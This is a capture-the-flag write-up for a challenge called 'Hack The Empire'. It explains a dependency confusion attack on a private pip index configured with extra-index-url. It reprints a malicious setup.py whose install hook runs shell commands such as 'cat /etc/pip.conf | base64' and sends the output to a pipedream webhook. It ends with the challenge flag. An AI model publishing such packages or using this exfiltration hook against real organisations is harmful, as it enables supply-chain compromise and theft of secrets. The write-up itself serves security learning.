# Hack The Empire

## Description

An enemy of The Empire have a job for you. As an adversary he want to hack CTFQ21EmpireTmp. He heard that in their server is hosting their holy flag in /flag.txt

No IP address is needed in this task. Good luck.

̿̿ ̿̿ ̿̿ ̿'̿'\̵͇̿̿\з= ( ▀ ͜͞ʖ▀) =ε/̵͇̿̿/'̿'̿ ̿ ̿̿ ̿̿ ̿̿

Important: Whatever was the solution that you're going to adopt, if you want to use webhooks, DO NOT USE any of those that allows other participants to see the flag (don't use webhook.site, you may let other participants to catch the flag from there) (for example you can use requestbin instead of webhook.site since the flag can be seen by the authenticated user). Think about using a method that will not leave anybody else to read the flag from your steps. And don't forget to remove your work after you solve the task to avoid anybody else to steal it.

Hint 1: find the original web page (in the original website) that was sharing what you've found since that page is not updated

Author: TheEmperors

## Solution

A quick Google search leads us to this blog post: https://ittone.ma/ittone/is-there-any-limit-in-pythons-requirements-txt-during-the-installation/

![Blog Post](./resources/blog.png?raw=true)

We can gather that the company is downloading packages from a private repository that match the following regex: `ctf_q21_empire_tmp_[a-z0-9_]{5,10}`

They also reveal the structure of their `pip.conf` file:

```
[global]
extra-index-url = http://<private_IP_and_port>/simple/
trusted-host = <private_IP>
```

Due to the behaviour of the `extra-index-url` option, pip will search their private repository in addition to the public repository, prioritizing them based on version number.

Therefore, we can trick the server into downloading a mallicious package by creating one that matches the regex with a sufficiently high version number.
We care told the location of the flag file, so we can read the flag as part of the install script.
To retreive the contents, we can use an http request containing the contents encoded in base64.

Additionally, if we search for the start of the regex, we find a removed package on PyPI, uploaded by TheEmperors.
Using Google's webcache feature, we can examine the repository despite it being removed:

https://webcache.googleusercontent.com/search?q=cache:N6A2lqcEQtcJ:https://pypi.org/project/ctf-q21-empire-tmp-bw13434/0.0.9/+&cd=1&hl=en&ct=clnk&gl=ca&client=firefox-b-d

We can download the contents of this package and modify it to work with out exploit.
The latest version of the package is [ctf-q21-empire-tmp-bw13434-0.0.9.tar.gz](./ctf-q21-empire-tmp-bw13434-0.0.9).

Let's examine the `setup.py` script:

```py
from setuptools import setup
import os
from setuptools.command.install import install

setup(
    name='ctf-q21-empire-tmp-bw13434',
    description='Bye world',
    version='0.0.9',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    )

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://ene63d9dv33i6ch.m.pipedream.net/?hehe="+os.popen("id").read()) #cat /flag.txt | base64").read())
```

The `setup` call appears ordinary, however, there is an http request within the `PostInstallCommand` function.
We can see that it sends a request to a webhook containing the output of `id`.
Also, contained in a comment is a command that conveniently reads the flag file and converts it to base64.
We can modify this function to send the flag instead of the id, and we change the first request parameter to send it to a webhook controlled by us.
Importantly, we have to move the function declaration to above the call to `setup`, otherwise it will not be defined during the setup and thus will not be run.

I also changed the name of the package in hopes that it would not overlap with another package of theirs with a greater or equal version.
The package is relatively small, so all other files were updated to match the new package name.

## Exploit

```py
from setuptools import setup
import os
from setuptools.command.install import install

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION
        import requests
        requests.get("https://enc2i9ljmjy100e.m.pipedream.net/?hehe="+os.popen("cat /etc/pip.conf | base64").read())

setup(
    name='ctf-q21-empire-tmp-1337420',
    description='Bye world',
    version='0.0.9',
    packages=['main'],
    install_requires=[
      'requests',
    ],
    cmdclass={
        'install': PostInstallCommand,
        },
    )
```

Within 5 minutes, we get a request with some data encoded in base64:

```
VGhpcyBpcyB3aGF0IHdlIGNhbGwgJ0RlcGVuZGVuY3kgY29uZnVzaW9uJ1xudGhhdCBpcyB3ZWxs
IGV4cGxhaW5lZCBoZXJlICh0aGlzIGlzIG5vdCBteSBhcnRpY2xlIGJ1dCBJIGxpa2VkIGl0KSBo
dHRwczovL21lZGl1bS5jb20vQGFsZXguYmlyc2FuL2RlcGVuZGVuY3ktY29uZnVzaW9uLTRhNWQ2
MGZlYzYxMCAuXG4gV2hpY2ggaXMgcGFydCBvZiB0aGUgT3BlbiBTb3VyY2UgU29mdHdhcmUgU3Vw
cGx5IENoYWluIEF0dGFja3MuXG5GbGFnOiBTZWN1cmluZXRze0QzUDNOZDNuY3lfQzBuRnU1IW5f
eERfd2VyZV95b3VfY29uZnVzZWRfZW5vdWdofVxuV2UgZGlkbid0IHdhbnQgdG8gbWFrZSBpdCBt
b3JlIGRpZmZpY3VsdCB0byB0YWtlIGluIGNvbnNpZGVyYXRpb24gd2hhdCBhbGwgdGhlIHRlYW1z
IG5lZWQgYXMgcmVxdWlyZW1lbnRzLiBUaGlzIGlzIHdoeSBmb3IgdGhlIHRpbWUgYmVpbmcgd2Ug
YXJlIG5vdCByZXF1ZXN0aW5nIGRpZmZpY3VsdCB0YXNrIChqdXN0IHJlYWQgdGhpcyBmaWxlIGlz
IGVub3VnaCkgYnV0IHRoZSBtaXNzY29uZmlndXJhdGlvbiBoZXJlIGlzIHRpZWQgd2l0aCB0aGUg
LS1leHRyYS1pbmRleC11cmwuIFlvdSBjYW4gY2hlY2sgdGhlIC9ldGMvcGlwLmNvbmYgaWYgeW91
IGFyZSBjdXJpb3VzIHRvIHNlZSBpZiB0aGlzIGlzIGEgcmVhbCB0YXNrIG9yIHdhcyBpdCBmYWtl
ZC4=
```

Which can be decoded into:

```
This is what we call 'Dependency confusion'\nthat is well explained here (this is not my article but I liked it) https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 .\n Which is part of the Open Source Software Supply Chain Attacks.\nFlag: Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}\nWe didn't want to make it more difficult to take in consideration what all the teams need as requirements. This is why for the time being we are not requesting difficult task (just read this file is enough) but the missconfiguration here is tied with the --extra-index-url. You can check the /etc/pip.conf if you are curious to see if this is a real task or was it faked.
```

## Flag

`Securinets{D3P3Nd3ncy_C0nFu5!n_xD_were_you_confused_enough}`

